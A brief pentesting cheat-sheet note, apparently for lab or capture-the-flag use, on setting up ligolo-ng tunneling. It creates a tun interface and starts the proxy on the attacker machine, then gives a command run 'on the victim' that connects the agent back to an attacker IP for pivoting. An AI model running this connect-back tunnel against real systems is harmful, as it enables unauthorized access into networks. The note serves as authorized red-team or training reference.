on linux:
```bash
sudo ip tuntap add user root mode tun ligolo

sudo ip link set ligolo up

~/tools/ligolo/proxy -selfcert
```

on the victim:
```bash
./agent -connect 10.10.17.138:11601 -ignore-cert

# attacker_ip:port_of_ligolo
```


[ref](https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/)
